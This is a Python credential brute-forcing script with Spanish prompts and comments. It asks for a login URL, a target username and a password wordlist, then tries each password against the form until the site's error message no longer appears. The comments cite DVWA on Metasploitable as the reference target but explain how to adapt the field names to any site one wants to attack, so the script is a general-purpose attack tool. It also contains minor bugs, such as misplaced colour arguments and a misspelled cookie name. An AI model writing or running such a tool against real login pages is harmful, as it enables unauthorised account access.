import requests
from termcolor import colored

url = input('[+] Ingrese la URL a realizar fuerza bruta >> ')
username = input('[+] Ingrese el usuario que desea atacar >> ')
password_file = input('[+] Ingrese el archivo de contraseñas >> ')
login_failed_message = input('[+] Ingrese el mensaje de error de login correspondiente a la URL ingresada >> ')
cookie_value = input('[+] Ingrese el valor de las cookies >> ')

def cracking(username, url):
	for password in passwords:
		password = password.strip()
		print(colored('Trying: ' + password), 'red')
		data = {'username':username, 'password':password, 'Login':'submit'}
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies  = {'Coookie':cookie_value})
		else:
			response = requests.post(url, data=data)
		if login_failed_message in response.content.decode():
			pass
		else:
			print(colored('[+] Usuario encontrado ==> ' + username), 'green')
			print(colored('[+] Contraseña encontrada ==> ' + password), 'green')
			exit()


with open(password_file, 'r') as passwords:
	cracking(username, url)

print(colored('[!] La contraseña no esta dentro del archivo. Actualiza!!' ), 'red')


#A considerar que los campos username, password, Login y submit son valores asociados a la web DVWA de metasploitable, estas variables/campos
# son distintas segun la web que se intente vulnerar con el script, o sea que ESOS CAMPOS SE DEBEN MODIFICAR DENTRO DEL CODIGO/SCRIPT SEGUN
# EL VALOR QUE SE OTORGUE EN LA WEB/URL QUE SE DESEA ATACAR. Esto se puede observar mediante analisis de codigo fuente

#A tener en cuenta igualmente que el cookie value solo es requerido cuando se necesita autenticar en una web dentro de otra web.





